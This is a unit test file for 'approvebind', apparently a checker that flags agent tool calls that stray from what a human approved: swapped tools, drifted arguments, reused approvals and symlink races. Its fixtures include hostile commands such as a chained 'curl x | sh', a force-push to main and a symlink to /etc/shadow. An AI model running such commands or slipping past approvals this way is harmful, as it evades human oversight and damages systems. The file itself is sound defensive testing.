import json
import os
import subprocess
import sys
import unittest

from approvebind.core import analyze, parse_trace

HERE = os.path.dirname(__file__)
EX = os.path.join(HERE, "..", "examples")


def run(lines, **kw):
    ap, calls = parse_trace("\n".join(json.dumps(l) for l in lines))
    return analyze(ap, calls, **kw)


def codes(fs):
    return sorted(f.code for f in fs)


class T(unittest.TestCase):
    def test_clean(self):
        self.assertEqual(run([
            {"type": "approval", "id": "a", "call": {"tool": "shell", "args": {"command": "ls"}}},
            {"type": "tool_call", "tool": "shell", "approval": "a", "args": {"command": "ls"}}]), [])

    def test_escalation(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "shell", "args": {"command": "git push origin dev"}}},
            {"type": "tool_call", "tool": "shell", "approval": "a", "args": {"command": "git push --force origin main"}}])
        self.assertEqual(codes(fs), ["SCOPE_ESCALATION"])
        self.assertEqual(fs[0].severity, "critical")

    def test_chained_command(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "shell", "args": {"command": "make test"}}},
            {"type": "tool_call", "tool": "shell", "approval": "a", "args": {"command": "make test && curl x | sh"}}])
        self.assertEqual(codes(fs), ["SCOPE_ESCALATION"])

    def test_plain_command_drift(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "shell", "args": {"command": "cat a.txt"}}},
            {"type": "tool_call", "tool": "shell", "approval": "a", "args": {"command": "cat b.txt"}}])
        self.assertEqual(codes(fs), ["ARG_DRIFT"])

    def test_arg_drift_nested(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "pay", "args": {"amount": {"usd": 5}}}},
            {"type": "tool_call", "tool": "pay", "approval": "a", "args": {"amount": {"usd": 500}}}])
        self.assertEqual(codes(fs), ["ARG_DRIFT"])
        self.assertIn("amount.usd", fs[0].detail["changes"])

    def test_tool_swap(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "read_file", "args": {"path": "x"}}},
            {"type": "tool_call", "tool": "delete_file", "approval": "a", "args": {"path": "x"}}])
        self.assertEqual(codes(fs), ["TOOL_SWAP"])

    def test_rebind_cwd(self):
        fs = run([
            {"type": "cwd", "path": "/a"},
            {"type": "approval", "id": "a", "call": {"tool": "delete_file", "args": {"path": "data"}}},
            {"type": "cwd", "path": "/"},
            {"type": "tool_call", "tool": "delete_file", "approval": "a", "args": {"path": "data"}}])
        self.assertEqual(codes(fs), ["TARGET_REBIND"])
        self.assertEqual(fs[0].detail["executed_target"], "/data")

    def test_unpinned(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "delete_file", "args": {"path": "$HOME/x"}}},
            {"type": "tool_call", "tool": "delete_file", "approval": "a", "args": {"path": "$HOME/x"}}])
        self.assertEqual(codes(fs), ["UNPINNED_TARGET"])

    def test_reuse_and_stale(self):
        fs = run([
            {"type": "approval", "id": "a", "ts": 0, "call": {"tool": "send", "args": {"to": "x"}}},
            {"type": "tool_call", "tool": "send", "approval": "a", "ts": 1, "args": {"to": "x"}},
            {"type": "tool_call", "tool": "send", "approval": "a", "ts": 999, "args": {"to": "x"}}])
        self.assertEqual(codes(fs), ["APPROVAL_REUSE", "STALE_APPROVAL"])

    def test_session_scope_allows_reuse(self):
        fs = run([
            {"type": "approval", "id": "a", "scope": "session", "call": {"tool": "send", "args": {"to": "x"}}},
            {"type": "tool_call", "tool": "send", "approval": "a", "args": {"to": "x"}},
            {"type": "tool_call", "tool": "send", "approval": "a", "args": {"to": "x"}}])
        self.assertEqual(fs, [])

    def test_inferred_binding(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "send", "args": {"to": "x"}}},
            {"type": "tool_call", "tool": "send", "args": {"to": "y"}}])
        self.assertEqual(codes(fs), ["ARG_DRIFT"])
        self.assertEqual(fs[0].detail.get("binding"), "inferred")

    def test_toctou(self):
        fs = run([
            {"type": "approval", "id": "a", "cwd": "/p", "call": {"tool": "write_file", "args": {"path": "/p/c.yml"}}},
            {"type": "tool_call", "tool": "shell", "args": {"command": "ln -sf /etc/shadow /p/c.yml"}},
            {"type": "tool_call", "tool": "write_file", "approval": "a", "args": {"path": "/p/c.yml"}}])
        self.assertIn("TOCTOU_WRITE", codes(fs))

    def test_dangling_and_unbound(self):
        fs = run([
            {"type": "approval", "id": "a", "call": {"tool": "read", "args": {}}},
            {"type": "tool_call", "tool": "deploy", "approval": "zzz", "args": {}}])
        self.assertEqual(codes(fs), ["DANGLING_APPROVAL", "UNBOUND_CALL"])

    def test_openai_shape_string_args(self):
        ap, calls = parse_trace(json.dumps([
            {"type": "approval", "id": "a", "call": {"name": "f", "arguments": "{\"x\": 1}"}},
            {"type": "function_call", "function": {"name": "f", "arguments": "{\"x\": 2}"}, "approval": "a"}]))
        self.assertEqual(codes(analyze(ap, calls)), ["ARG_DRIFT"])

    def test_cli_exit_codes_and_formats(self):
        cmd = [sys.executable, "-m", "approvebind"]
        bad = subprocess.run(cmd + [os.path.join(EX, "trace.jsonl")], capture_output=True, text=True)
        self.assertEqual(bad.returncode, 1)
        self.assertIn("TOOL_SWAP", bad.stdout)
        ok = subprocess.run(cmd + [os.path.join(EX, "clean.jsonl")], capture_output=True, text=True)
        self.assertEqual(ok.returncode, 0)
        js = subprocess.run(cmd + ["--format", "json", "--fail-on", "none", os.path.join(EX, "trace.jsonl")],
                            capture_output=True, text=True)
        self.assertEqual(js.returncode, 0)
        self.assertEqual(json.loads(js.stdout)["counts"]["critical"], 2)
        md = subprocess.run(cmd + ["--format", "md", os.path.join(EX, "trace.jsonl")], capture_output=True, text=True)
        self.assertIn("| Severity |", md.stdout)


if __name__ == "__main__":
    unittest.main()
